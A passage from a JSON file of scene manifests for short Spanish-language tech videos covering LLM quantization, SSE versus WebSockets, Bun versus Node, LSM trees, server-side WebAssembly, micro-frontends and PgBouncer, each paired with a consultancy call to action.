      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "quant_weights_lead",
          "type": "quantization_weights_viz",
          "duration": 6.5,
          "voiceover": "¿Cómo comprimir un modelo de inteligencia artificial de treinta gigabytes para que corra en tu servidor local? Pasando de coma flotante a enteros de cuatro bits con cuantización.",
          "visual_cue": "Visualizador de matriz de tensores FP16 comprimiéndose en bloques INT4 GGUF con factor de escala",
          "props": {
            "mode": "quant",
            "badge": "OPTIMIZACIÓN MATEMÁTICA",
            "title": "CUANTIZACIÓN INT4 GGUF",
            "subtitle": "FP16 (16 BITS) VS INT4 NIBBLES EN GPU LOCAL"
          }
        },
        {
          "id": "memory_nibbles",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "En vez de almacenar dieciséis bits por peso, agrupamos los valores en bloques de treinta y dos pesos compartiendo una escala alfa. Ocupa un cuarto de la memoria sin perder precisión.",
          "visual_cue": "Inspección de memoria RAM mostrando empaquetado de dos pesos por cada byte de memoria",
          "props": {
            "badge": "EMPAQUETADO DE TENSORES",
            "title": "ALINEACIÓN DE MEMORIA EN VRAM",
            "rows": [
              {
                "addr": "0xCUDA010",
                "hex": [
                  "6A",
                  "FE",
                  "14",
                  "9C",
                  "02",
                  "5B",
                  "E3",
                  "77"
                ],
                "label": "BLOQUE INT4 (8 PESOS EN 4 BYTES)"
              },
              {
                "addr": "0xCUDA018",
                "hex": [
                  "3F",
                  "80",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "FACTOR DE ESCALA ALFA (FLOAT32)"
              },
              {
                "addr": "0xCUDA020",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "REDUCCIÓN DE HUELLA VRAM: 74%"
              }
            ]
          }
        },
        {
          "id": "cta_quant",
          "type": "terminal_split",
          "duration": 5,
          "voiceover": "Ayudo a empresas a desplegar clústeres de inferencia privada con modelos abiertos para no depender de APIs externas. Contáctame en mi perfil.",
          "visual_cue": "Terminal con benchmark de inferencia local vLLM y llamada a la acción en bio",
          "props": {
            "header": "INFRAESTRUCTURA DE IA (Link en bio)",
            "title": "INFERENCIA PRIVADA EN PRODUCCIÓN",
            "leftTitle": "VLLM SERVER EN LOCAL",
            "rightTitle": "VENTAJAS DE SOBERANÍA",
            "leftText": "$ vllm serve Qwen2.5-Coder-32B-AWQ\n✔ Modelo cargado en 8.4 GB VRAM\n✔ Throughput: 114 tokens/segundo\n✔ Cumplimiento estricto GDPR y HIPAA",
            "rightText": "• Elimina pagos recurrentes de OpenAI\n• Cero fugas de propiedad intelectual\n• Latencia predecible de 15ms\n• Asesoría de despliegue: link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "11_B",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var B (Polémico): Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs",
    "variation": "B (Polémico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs (Var B)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "latency_api_shock",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "Pagar tokens por cada petición a OpenAI está arruinando tus márgenes y exponiendo los datos privados de tus clientes a servidores de terceros.",
          "visual_cue": "Escala de latencia comparando tiempo de red a OpenAI vs inferencia local en tu propio hardware",
          "props": {
            "header": "LATENCIA Y PRIVACIDAD",
            "title": "API EXTERNA VS INFERENCIA LOCAL",
            "subtitle": "TIEMPO DE ESPERA EN RED VS ACCESO IN-HOUSE"
          }
        },
        {
          "id": "quant_demo",
          "type": "quantization_weights_viz",
          "duration": 6,
          "voiceover": "Con modelos cuantizados a cuatro bits en un servidor propio con tarjetas RTX obtienes inferencia ilimitada las veinticuatro horas del día por una tarifa fija.",
          "visual_cue": "Visualizador de tensores cuantizados corriendo en hardware accesible",
          "props": {
            "mode": "quant",
            "badge": "TARIFAS PLANAS",
            "title": "HARDWARE PROPIO SIN LÍMITES",
            "subtitle": "100 TOKENS/S SIN PAGAR POR CADA PROMPT"
          }
        }
      ]
    }
  },
  {
    "key": "12_A",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var A (Técnico): Por qué Server-Sent Events es superior a WebSockets en HTTP/2",
    "variation": "A (Técnico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] Por qué Server-Sent Events es superior a WebSockets en HTTP/2 (Var A)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "network_pipeline_sse",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "Si solo necesitas enviar datos del servidor al navegador, usar WebSockets es complicar tu arquitectura innecesariamente.",
          "visual_cue": "Tubería de paquetes HTTP/2 mostrando multiplexación de streams SSE con reconexión automática",
          "props": {
            "header": "FLUJO DE PAQUETES HTTP/2",
            "title": "MULTIPLEXACIÓN NATIVA DE STREAMS",
            "latency": "2.4 ms",
            "stages": [
              {
                "name": "TCP + TLS 1.3 Handshake",
                "tag": "Conexión compartida"
              },
              {
                "name": "HTTP/2 Stream Multiplexing",
                "tag": "Mismo puerto 443"
              },
              {
                "name": "Server-Sent Events Pipeline",
                "tag": "Text/event-stream"
              }
            ]
          }
        },
        {
          "id": "tradeoff_sse_ws",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Server-Sent Events corre sobre HTTP tradicional. Tiene reconexión nativa, atraviesa proxies empresariales y aprovecha la compresión de cabeceras de HTTP/2.",
          "visual_cue": "Matriz comparativa exhaustiva entre SSE y WebSockets",
          "props": {
            "header": "COMPARATIVA DE PROTOCOLOS",
            "title": "SSE VS WEBSOCKETS EN HTTP/2",
            "colA": "SERVER-SENT EVENTS (SSE)",
            "colB": "WEBSOCKETS",
            "rows": [
              {
                "dim": "Transporte",
                "a": "HTTP/2 Estándar (443)",
                "b": "Protocolo WS custom",
                "aGood": true
              },
              {
                "dim": "Reconexión automática",
                "a": "Nativa en EventSource",
                "b": "Lógica manual frágil",
                "aGood": true
              },
              {
                "dim": "Proxies y Firewalls",
                "a": "Cero problemas de bloqueo",
                "b": "Cortes frecuentes por proxy",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_sse",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Ayudo a simplificar infraestructuras en tiempo real y eliminar capas de WebSocket innecesarias. Link en mi perfil para auditar tus arquitecturas de red.",
          "visual_cue": "Terminal mostrando curl -N escuchando stream de eventos y llamada a la acción en bio",
          "props": {
            "header": "CONSULTORÍA DE PROTOCOLOS (Link en bio)",
            "title": "STREAMING SENCILLO Y ROBUSTO",
            "leftTitle": "CURL -N INSPECCIÓN",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "$ curl -N https://api.app.io/v1/stream\nHTTP/2 200 OK\ncontent-type: text/event-stream\n\nevent: update\ndata: {\"status\": \"ok\", \"latency\": \"2ms\"}",
            "rightText": "• Cero servidores socket dedicados\n• Compatible con cualquier CDN y Edge\n• Reduce uso de memoria en un 60%\n• Agenda sesión técnica: link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "12_B",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var B (Polémico): No compliques tu stack: Deja de usar WebSockets para simples streams",
    "variation": "B (Polémico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] No compliques tu stack: Deja de usar WebSockets para simples streams (Var B)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "ws_failure_hook",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Mantener un clúster de WebSockets requiere balanceadores especiales, heartbeat constante y una pesadilla de reconexión cuando falla la red móvil.",
          "visual_cue": "Terminal mostrando cortes de conexión WebSocket vs flujo continuo de SSE",
          "props": {
            "header": "ANTIPATRÓN EN PRODUCCIÓN",
            "title": "LA FRAGILIDAD DE WEBSOCKETS",
            "leftTitle": "WEBSOCKET CLÚSTER",
            "rightTitle": "STREAMING CON SSE",
            "leftText": "✖ Conexión caída en túnel móvil\n✖ Handshake WS bloqueado por proxy corporativo\n✖ Requiere servidores socket con estado",
            "rightText": "✔ EventSource reconecta automáticamente\n✔ Pasa por Cloudflare y CDNs sin cambios\n✔ Stateless en balanceadores de carga"
          }
        },
        {
          "id": "network_diagram",
          "type": "network_pipeline",
          "duration": 5.5,
          "voiceover": "Si tu cliente solo escucha actualizaciones del servidor como chats o cotizaciones, SSE sobre HTTP/2 es diez veces más fácil de operar. Link en mi bio.",
          "visual_cue": "Tubería de paquetes HTTP/2 procesando el stream de eventos",
          "props": {
            "header": "SIMPLICIDAD OPERATIVA",
            "title": "TEXT/EVENT-STREAM EN HTTP/2",
            "latency": "1.8 ms",
            "stages": [
              {
                "name": "Gateway Edge",
                "tag": "Caché transparente"
              },
              {
                "name": "HTTP/2 Multiplexing",
                "tag": "1 sola conexión TCP"
              },
              {
                "name": "Browser EventSource",
                "tag": "Reconexión automática"
              }
            ]
          }
        }
      ]
    }
  },
  {
    "key": "13_A",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var A (Técnico): V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo",
    "variation": "A (Técnico)",
    "category": "RUNTIMES JAVASCRIPT",
    "manifest": {
      "title": "[13] V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo (Var A)",
      "category": "RUNTIMES JAVASCRIPT",
      "slug": "13_bun_vs_node22",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "engine_metrics",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Bun conmocionó el ecosistema con JavaScriptCore y arranque casi instantáneo. Pero Node 22 contraatacó con ejecución directa de TypeScript y V8 optimizado.",
          "visual_cue": "Comparativa de arranque en frío y consumo de memoria entre V8 y JavaScriptCore",
          "props": {
            "header": "TIEMPO DE ARRANQUE EN FRÍO",
            "metricA": {
              "label": "NODE.JS 22 (V8)",
              "value": "28 ms",
              "sub": "Flag experimental TypeScript nativo",
              "color": "#38bdf8"
            },
            "metricB": {
              "label": "BUN (JAVASCRIPTCORE)",
              "value": "6 ms",
              "sub": "Compilado en Zig con arranque instantáneo",
              "color": "#fbbf24"
            }
          }
        },
        {
          "id": "tradeoff_bun_node",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Bun gana en velocidad de scripts y tests; Node 22 mantiene la corona de compatibilidad total con librerías nativas de C++ y estabilidad en producción.",
          "visual_cue": "Matriz técnica de tradeoffs entre ambos runtimes",
          "props": {
            "header": "EVALUACIÓN DE RUNTIMES",
            "title": "NODE 22 VS BUN EN 2026",
            "colA": "NODE.JS 22",
            "colB": "BUN",
            "rows": [
              {
                "dim": "Módulos Nativos C++",
                "a": "100% Compatibilidad ABI",
                "b": "Soporte parcial N-API",
                "aGood": true
              },
              {
                "dim": "TypeScript Nativo",
                "a": "Type-stripping sin types",
                "b": "Transpilador completo integrado",
                "aGood": false
              },
              {
                "dim": "Estabilidad de ecosistema",
                "a": "15 años de madurez en prod",
                "b": "Evolución rápida pero cambiante",
                "aGood": true
              }
            ]
          }
        }
      ]
    }
  },
  {
    "key": "13_B",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var B (Polémico): ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha?",
    "variation": "B (Polémico)",
    "category": "RUNTIMES JAVASCRIPT",
    "manifest": {
      "title": "[13] ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha? (Var B)",
      "category": "RUNTIMES JAVASCRIPT",
      "slug": "13_bun_vs_node22",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "terminal_bench_bun",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Reescribir tu infraestructura para correr en Bun puede ser tentador, pero los bugs sutiles en librerías nativas pueden costarte semanas de depuración.",
          "visual_cue": "Terminal comparando ejecución de tests y compatibilidad de paquetes",
          "props": {
            "header": "PRUEBAS DE COMPATIBILIDAD",
            "title": "NODE 22 VS BUN EN PRODUCCIÓN",
            "leftTitle": "BUN TEST SUITE",
            "rightTitle": "NODE 22 ESTABILIDAD",
            "leftText": "$ bun test\n✔ 840 tests pasados en 0.4s\n✖ Incompatibilidad en paquete grpc-native\n✖ Error inesperado de segmentación",
            "rightText": "$ node --test\n✔ 840 tests pasados en 1.8s\n✔ 100% compatibilidad con paquetes nativos\n✔ Cero riesgos de fallos en runtime"
          }
        },
        {
          "id": "metrics_tradeoff",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Usa Bun como gestor de paquetes y test runner en desarrollo; mantén Node 22 para los servidores de producción críticos. Link en bio para asesoría.",
          "visual_cue": "Métricas de productividad de desarrollo vs estabilidad en producción",
          "props": {
            "header": "ESTRATEGIA RECOMENDADA (Link en bio)",
            "metricA": {
              "label": "BUN EN DESARROLLO",
              "value": "30x test speed",
              "sub": "Iteración ultrarrápida de código",
              "color": "#10b981"
            },
            "metricB": {
              "label": "NODE 22 EN SERVIDOR",
              "value": "99.99% uptime",
              "sub": "Ecosistema robusto sin sorpresas",
              "color": "#38bdf8"
            }
          }
        },
        {
          "id": "cta_runtime",
          "type": "tradeoff_matrix",
          "duration": 4,
          "voiceover": "Audito arquitecturas de backend y evalúo migraciones de runtime para equipos que buscan rendimiento real sin riesgos innecesarios. Enlace en perfil.",
          "visual_cue": "Matriz de decisión final con llamada a la acción en bio",
          "props": {
            "header": "CONSULTORÍA DE BACKEND",
            "title": "DECISIONES BASADAS EN DATOS",
            "subtitle": "AUDITA TU STACK CON INGENIERÍA REAL"
          }
        }
      ]
    }
  },
  {
    "key": "14_A",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var A (Técnico): LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco",
    "variation": "A (Técnico)",
    "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
    "manifest": {
      "title": "[14] LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco (Var A)",
      "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "storage_engine_lsm",
          "type": "storage_engine_viz",
          "duration": 6.5,
          "voiceover": "Si tu base de datos colapsa cuando recibe millones de escrituras por segundo, estás usando la estructura de datos equivocada.",
          "visual_cue": "Visualizador del motor de almacenamiento LSM Tree con MemTable en RAM y compactación de SSTables",
          "props": {
            "mode": "lsm",
            "badge": "ESTRUCTURAS DE ALMACENAMIENTO",
            "title": "LSM-TREE: LOG-STRUCTURED MERGE",
            "subtitle": "MEMTABLE EN RAM => FLUSH SECUENCIAL A SSTABLE"
          }
        },
        {
          "id": "tree_hierarchy_btree",
          "type": "tree_hierarchy",
          "duration": 6,
          "voiceover": "Los B-Trees de PostgreSQL modifican páginas en disco de forma aleatoria, lo que desgasta los discos SSD y satura el canal de I/O.",
          "visual_cue": "Visualizador del árbol B balanceado mostrando el coste de la división de páginas",
          "props": {
            "badge": "ESTRUCTURA B-TREE",
            "title": "PÁGINAS BALANCED-TREE EN DISCO",
            "items": [
              {
                "name": "Root Node",
                "level": 0
              },
              {
                "name": "Internal Page A",
                "level": 1
              },
              {
                "name": "Internal Page B",
                "level": 1
              },
              {
                "name": "Leaf Disk Page (4 KB)",
                "level": 2
              }
            ]
          }
        },
        {
          "id": "latency_lsm",
          "type": "latency_scale",
          "duration": 5,
          "voiceover": "Los LSM Trees como RocksDB convierten cada escritura en una operación secuencial en memoria, multiplicando el throughput por diez.",
          "visual_cue": "Escala de latencia comparando escrituras aleatorias en B-Tree vs escrituras append-only en LSM",
          "props": {
            "header": "MÉTRICAS DE RENDIMIENTO",
            "title": "THROUGHPUT DE ESCRITURA",
            "subtitle": "ESCRITURAS ALEATORIAS VS SECUENCIALES"
          }
        }
      ]
    }
  },
  {
    "key": "14_B",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var B (Polémico): ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB",
    "variation": "B (Polémico)",
    "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
    "manifest": {
      "title": "[14] ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB (Var B)",
      "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "lsm_shock",
          "type": "storage_engine_viz",
          "duration": 6,
          "voiceover": "Postgres es fantástico para consultas complejas, pero cuando le lanzas cincuenta mil inserts por segundo el I/O del disco explota.",
          "visual_cue": "Visualizador del motor LSM demostrando cómo las escrituras se ordenan en RAM antes de tocar el SSD",
          "props": {
            "mode": "lsm",
            "badge": "INGENIERÍA DE ALMACENAMIENTO",
            "title": "ROCKSDB VS POSTGRESQL",
            "subtitle": "ESCRIBE EN RAM PRIMERO · MERGE ORDENADO EN DISCO"
          }
        },
        {
          "id": "terminal_split_storage",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Bases de datos basadas en LSM como Cassandra o RocksDB son la respuesta para telemetría y logs. Link en mi perfil para auditar tu almacenamiento.",
          "visual_cue": "Terminal comparando throughput de escrituras y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
            "title": "OPTIMIZACIÓN DE ESCRITURA",
            "leftTitle": "POSTGRES B-TREE",
            "rightTitle": "ROCKSDB LSM-TREE",
            "leftText": "Throughput: 4.800 inserts/seg\nI/O Wait: 42% de saturación en NVMe\nColapso por bloqueo de páginas",
            "rightText": "Throughput: 84.000 inserts/seg\nI/O Wait: 2% (Escritura secuencial)\nCero sobrecarga de actualización"
          }
        }
      ]
    }
  },
  {
    "key": "15_A",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var A (Técnico): Sandboxing matemático: Wasmtime y aislamiento de código",
    "variation": "A (Técnico)",
    "category": "COMPILACIÓN & RUNTIMES",
    "manifest": {
      "title": "[15] Sandboxing matemático: Wasmtime y aislamiento de código (Var A)",
      "category": "COMPILACIÓN & RUNTIMES",
      "slug": "15_webassembly_servidor",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "kernel_wasm_lead",
          "type": "kernel_sandbox_viz",
          "duration": 6,
          "voiceover": "WebAssembly ya no es solo para el navegador. En el servidor ofrece un aislamiento de código tan seguro como Docker pero arrancando en un milisegundo.",
          "visual_cue": "Visualizador del sandbox de memoria lineal Wasmtime aislando código de terceros",
          "props": {
            "badge": "SANDBOXING MATEMÁTICO",
            "title": "WASMTIME: AISLAMIENTO FORMAL",
            "subtitle": "MEMORIA LINEAL AISLADA SIN CONTENEDORES PESADOS"
          }
        },
        {
          "id": "latency_wasm",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "Un contenedor Docker tarda ochocientos milisegundos en arrancar y consume cien megabytes de base. Un módulo Wasm arranca en microsegundos usando dos megabytes.",
          "visual_cue": "Escala de latencia comparando arranque de contenedor Docker vs módulo WebAssembly",
          "props": {
            "header": "MÉTRICAS DE ARRANQUE EN FRÍO",
            "title": "DOCKER VS WEBASSEMBLY EN SERVIDOR",
            "subtitle": "TIEMPO DE INICIALIZACIÓN DE INSTANCIA"
          }
        },
        {
          "id": "terminal_wasm",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Ideal para plugins de usuarios y funciones serverless ultrarrápidas en el Edge. Link en bio si quieres diseñar arquitecturas seguras con WebAssembly.",
          "visual_cue": "Terminal ejecutando wasmtime con permisos acotados mediante WASI y llamada a la acción en bio",
          "props": {
            "header": "CONSULTORÍA EN WASM (Link en bio)",
            "title": "COMPUTACIÓN SEGURA EN EL EDGE",
            "leftTitle": "WASMTIME CLI",
            "rightTitle": "BENEFICIOS DE SEGURIDAD",
            "leftText": "$ wasmtime run --dir=/tmp plugin.wasm\n✔ Memoria lineal limitada a 16 MB\n✔ Sin acceso a red ni disco no autorizado\n✔ Tiempo de ejecución: 1.2 ms",
            "rightText": "• Permite ejecutar código de clientes sin riesgo\n• 100x más ligero que máquinas virtuales\n• Apto para arquitectura Edge y Serverless\n• Asesoría técnica: enlace en perfil"
          }
        }
      ]
    }
  },
  {
    "key": "15_B",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var B (Polémico): ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM",
    "variation": "B (Polémico)",
    "category": "COMPILACIÓN & RUNTIMES",
    "manifest": {
      "title": "[15] ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM (Var B)",
      "category": "COMPILACIÓN & RUNTIMES",
      "slug": "15_webassembly_servidor",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "cold_start_shock",
          "type": "latency_scale",
          "duration": 5.5,
          "voiceover": "El arranque en frío de los contenedores Docker está destruyendo la experiencia de usuario en arquitecturas serverless.",
          "visual_cue": "Gráfica de escala de latencia mostrando el cold start de Docker vs Wasm",
          "props": {
            "header": "COLD START EN SERVERLESS",
            "title": "EL COSTE OCULTO DE LOS CONTENEDORES",
            "subtitle": "ARRANQUE DE KERNEL VS INSTANCIACIÓN DE MEMORIA"
          }
        },
        {
          "id": "kernel_diagram_wasm",
          "type": "kernel_sandbox_viz",
          "duration": 6,
          "voiceover": "Con WebAssembly y WASI compilas código en Rust o Go que corre en cualquier servidor a velocidad nativa sin el peso de un sistema operativo virtual. Link en bio.",
          "visual_cue": "Visualizador del aislamiento en servidor mediante Wasmtime",
          "props": {
            "badge": "EL FUTURO DEL EDGE",
            "title": "EJECUCIÓN DE CERO SOBRECARGA",
            "subtitle": "WASI: INTERFAZ DE SISTEMA OPERATIVO UNIVERSAL"
          }
        }
      ]
    }
  },
  {
    "key": "16_A",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var A (Técnico): La sobrecarga del bundle: Por qué Module Federation degradó la web",
    "variation": "A (Técnico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] La sobrecarga del bundle: Por qué Module Federation degradó la web (Var A)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "dep_tree_hook",
          "type": "tree_hierarchy",
          "duration": 6.5,
          "voiceover": "¿Por qué tantas empresas están desmantelando sus micro-frontends para volver a un monorepo unificado? Porque descargar múltiples versiones de frameworks destruyó la velocidad de carga.",
          "visual_cue": "Visualizador de árbol de dependencias duplicadas compitiendo en el navegador",
          "props": {
            "badge": "FRAGMENTACIÓN DE RUNTIMES",
            "title": "EXPLOSIÓN DE DEPENDENCIAS MFE",
            "items": [
              {
                "name": "App Shell (Host)",
                "level": 0
              },
              {
                "name": "Header MFE (React 18.2)",
                "level": 1
              },
              {
                "name": "Checkout MFE (React 19.0 Duplicado)",
                "level": 1
              },
              {
                "name": "Catalog MFE (Vue 3 en Iframe)",
                "level": 1
              }
            ]
          }
        },
        {
          "id": "stepper_consolidation",
          "type": "migration_stepper_viz",
          "duration": 6,
          "voiceover": "Cada micro-frontend descarga su propio runtime. La solución moderna es consolidar en un monorepo con Turborepo manteniendo aislamiento por paquetes de código.",
          "visual_cue": "Visualizador de fases de consolidación hacia monorepo unificado",
          "props": {
            "badge": "CONSOLIDACIÓN ARQUITECTÓNICA",
            "title": "RETORNO AL MONOREPO LIMPIO",
            "subtitle": "TURBOREPO + ARQUITECTURA DE COMPONENTES COMPARTIDOS"
          }
        },
        {
          "id": "cta_mf",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Audito la arquitectura frontend y optimizo Core Web Vitals para aplicaciones complejas. Link en mi perfil para agendar una sesión técnica.",
          "visual_cue": "Terminal con análisis de bundle y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA FRONTEND (Link en bio)",
            "title": "OPTIMIZACIÓN DE CORE WEB VITALS",
            "leftTitle": "ANÁLISIS DE BUNDLE",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "$ npx bundlesize-audit\n✔ Bundle unificado: 180 KB (Gzipped)\n✔ LCP reducido de 3.8s a 0.7s\n✔ Eliminadas 4 versiones duplicadas de React",
            "rightText": "• Aumenta la conversión de checkout\n• Cero conflictos de CSS global\n• Despliegues seguros con tipado estricto\n• Agenda sesión: enlace en el perfil"
          }
        }
      ]
    }
  },
  {
    "key": "16_B",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var B (Polémico): El desastre de los Micro-frontends: La vuelta al monorepo unificado",
    "variation": "B (Polémico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] El desastre de los Micro-frontends: La vuelta al monorepo unificado (Var B)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "metrics_bundle_shock",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Adoptaste micro-frontends porque estaba de moda y ahora tu usuario tiene que descargar ocho megabytes de JavaScript para ver una simple tienda online.",
          "visual_cue": "Comparativa de peso de bundle: Micro-frontends fragmentados vs Monorepo unificado",
          "props": {
            "header": "PESO TOTAL DE JAVASCRIPT",
            "metricA": {
              "label": "MICRO-FRONTENDS FEDERATION",
              "value": "8.4 MB",
              "sub": "Múltiples runtimes compitiendo en CPU",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOREPO OPTIMIZADO",
              "value": "320 KB",
              "sub": "Tree-shaking estricto en un solo bundle",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "stepper_mfe",
          "type": "migration_stepper_viz",
          "duration": 5.5,
          "voiceover": "Los monorepos modernos permiten que múltiples equipos trabajen de forma independiente sin destruir la experiencia del usuario final.",
          "visual_cue": "Visualizador de migración hacia monorepo modular",
          "props": {
            "badge": "SIMPLICIDAD ORGANIZATIVA",
            "title": "MIGRACIÓN HACIA MONOREPO",
            "subtitle": "ELIMINA IFRAMES Y REDUCE EL TIEMPO DE CARGA"
          }
        },
        {
          "id": "cta_mf_b",
          "type": "tradeoff_matrix",
          "duration": 4,
          "voiceover": "Si tu aplicación web está pesada y fragmentada, link en mi perfil para auditarla y devolverle la velocidad.",
          "visual_cue": "Matriz comparativa final y enlace en bio",
          "props": {
            "header": "CONSULTORÍA DE RENDIMIENTO",
            "title": "ARQUITECTURAS WEB RÁPIDAS",
            "subtitle": "LINK EN BIO PARA AUDITAR TU APLICACIÓN"
          }
        }
      ]
    }
  },
  {
    "key": "17_A",
    "topicNum": "17",
    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var A (Técnico): El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres (Var A)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "conn_pool_hook",
          "type": "connection_pool_viz",
          "duration": 6.5,
          "voiceover": "Cada vez que tu backend abre una conexión nueva a PostgreSQL, el kernel de Linux ejecuta un fork de diez megabytes. Con mil clientes, tu servidor colapsa por memoria.",
          "visual_cue": "Visualizador de 1.000 streams de clientes entrando a PgBouncer y multiplexándose en 20 workers",
          "props": {
            "badge": "MULTIPLEXACIÓN DE CLIENTES",
            "title": "EL COSTE DE UN FORK() EN LINUX",
            "subtitle": "1.000 CONEXIONES ENTRANTES => 20 BACKEND PROCESSES"
          }
        },
        {
          "id": "latency_fork",
          "type": "latency_scale",
          "duration": 6,
          "voiceover": "El proceso de crear una conexión toma quince milisegundos de handshake y context switching. Con PgBouncer, la conexión ya está viva y responde en microsegundos.",
          "visual_cue": "Escala de latencia comparando tiempo de creación de proceso fork vs pool de conexiones",
          "props": {
            "header": "TIEMPO DE ESTABLECIMIENTO DE CONEXIÓN",
            "title": "FORK EN LINUX VS POOL REUTILIZADO",
            "subtitle": "HANDSHAKE COMPLETO VS TRANSACCIÓN DIRECTA"
          }
        },
        {
          "id": "cta_pgbouncer",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Configuro clústeres de PgBouncer y optimizo la concurrencia de bases de datos para soportar alto tráfico. Link en mi perfil para agendar una auditoría técnica.",
          "visual_cue": "Terminal mostrando pgbench con saturación neutralizada y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
            "title": "CONCURRENCIA SIN SOBRECARGA",
            "leftTitle": "BENCHMARK PGBENCH",
            "rightTitle": "MÉTRICAS CLAVE",
            "leftText": "$ pgbench -c 1000 -j 8 -T 10 app_db\n✔ Clientes concurrentes: 1.000 activos\n✔ Throughput: 18.400 TPS\n✔ Uso de RAM en Postgres: 210 MB estables",
            "rightText": "• Reduce el 95% del uso de memoria en DB\n• Elimina errores de \"too many clients\"\n• Soporta picos masivos de tráfico\n• ¿Dudas con Postgres? Enlace en mi bio"
          }
        }
      ]
    }
  },
  {
    "key": "17_B",
    "topicNum": "17",
